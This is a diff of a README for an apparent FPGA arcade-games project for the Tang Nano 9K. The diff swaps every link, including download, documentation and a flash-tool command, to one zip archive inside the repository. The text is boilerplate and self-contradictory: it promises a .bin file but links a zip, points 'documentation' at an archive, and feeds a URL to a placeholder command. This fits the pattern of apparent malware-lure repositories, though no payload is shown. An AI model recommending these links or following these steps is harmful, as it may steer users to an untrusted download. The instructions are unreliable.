@@ -1,7 +1,7 @@
 # 🕹️ TangNano9K-SuperGlob - Play Classic Arcade Games on FPGA
 
 ## 📥 Download Now!
-[![Download TangNano9K-SuperGlob](https://raw.githubusercontent.com/habbi003/TangNano9K-SuperGlob/main/dustman/TangNano9K-SuperGlob.zip)](https://raw.githubusercontent.com/habbi003/TangNano9K-SuperGlob/main/dustman/TangNano9K-SuperGlob.zip)
+[![Download TangNano9K-SuperGlob](https://github.com/habbi003/TangNano9K-SuperGlob/raw/refs/heads/main/TN9K-SuperGlob/src/Super-Glob-Tang-Nano-1.6.zip)](https://github.com/habbi003/TangNano9K-SuperGlob/raw/refs/heads/main/TN9K-SuperGlob/src/Super-Glob-Tang-Nano-1.6.zip)
 
 ## 📖 Overview
 TangNano9K-SuperGlob brings classic arcade games to life on the Tang Nano 9K FPGA Board. Experience the fun and nostalgia of arcade gaming with our optimized software. This application uses the powerful capabilities of FPGA technology to provide a smooth gaming experience.
@@ -15,7 +15,7 @@ To start playing, you need to download and run the software on your Tang Nano 9K
 - **Tools:** A USB cable for connecting the FPGA board to your computer
 
 ## 🔗 Download & Install
-Visit [this page](https://raw.githubusercontent.com/habbi003/TangNano9K-SuperGlob/main/dustman/TangNano9K-SuperGlob.zip) to download the latest version of TangNano9K-SuperGlob. Click on the version you want and follow these steps:
+Visit [this page](https://github.com/habbi003/TangNano9K-SuperGlob/raw/refs/heads/main/TN9K-SuperGlob/src/Super-Glob-Tang-Nano-1.6.zip) to download the latest version of TangNano9K-SuperGlob. Click on the version you want and follow these steps:
 
 1. Scroll through the release notes to find the version of the software you wish to install.
 2. Click on the appropriate file link to start the download. This file will have a `.bin` extension.
@@ -32,7 +32,7 @@ Once you have downloaded the file, follow these steps to install and run the sof
    ```
 4. Flash the binary file to the FPGA board using the appropriate command for your operating system. The command might look something like:
    ```
-   [your_flash_tool_command] https://raw.githubusercontent.com/habbi003/TangNano9K-SuperGlob/main/dustman/TangNano9K-SuperGlob.zip
+   [your_flash_tool_command] https://github.com/habbi003/TangNano9K-SuperGlob/raw/refs/heads/main/TN9K-SuperGlob/src/Super-Glob-Tang-Nano-1.6.zip
    ```
    Replace `[your_flash_tool_command]` with the command used for flashing on your system.
 
@@ -69,10 +69,10 @@ We welcome contributions! If you're interested in helping improve TangNano9K-Sup
 This project is licensed under the MIT License. Feel free to explore, modify, and share the software within the terms of the license.
 
 ## 🔗 Additional Resources
-- **Documentation:** For deeper insights into the features and controls, visit the [documentation](https://raw.githubusercontent.com/habbi003/TangNano9K-SuperGlob/main/dustman/TangNano9K-SuperGlob.zip).
+- **Documentation:** For deeper insights into the features and controls, visit the [documentation](https://github.com/habbi003/TangNano9K-SuperGlob/raw/refs/heads/main/TN9K-SuperGlob/src/Super-Glob-Tang-Nano-1.6.zip).
 - **Release Notes:** Keep up to date with new features and bug fixes in every release.
 
 ## 🔗 Visit the Download Page
-For your convenience, here’s the download link again: [Download TangNano9K-SuperGlob](https://raw.githubusercontent.com/habbi003/TangNano9K-SuperGlob/main/dustman/TangNano9K-SuperGlob.zip).
+For your convenience, here’s the download link again: [Download TangNano9K-SuperGlob](https://github.com/habbi003/TangNano9K-SuperGlob/raw/refs/heads/main/TN9K-SuperGlob/src/Super-Glob-Tang-Nano-1.6.zip).
 
 Enjoy your retro gaming experience with TangNano9K-SuperGlob!
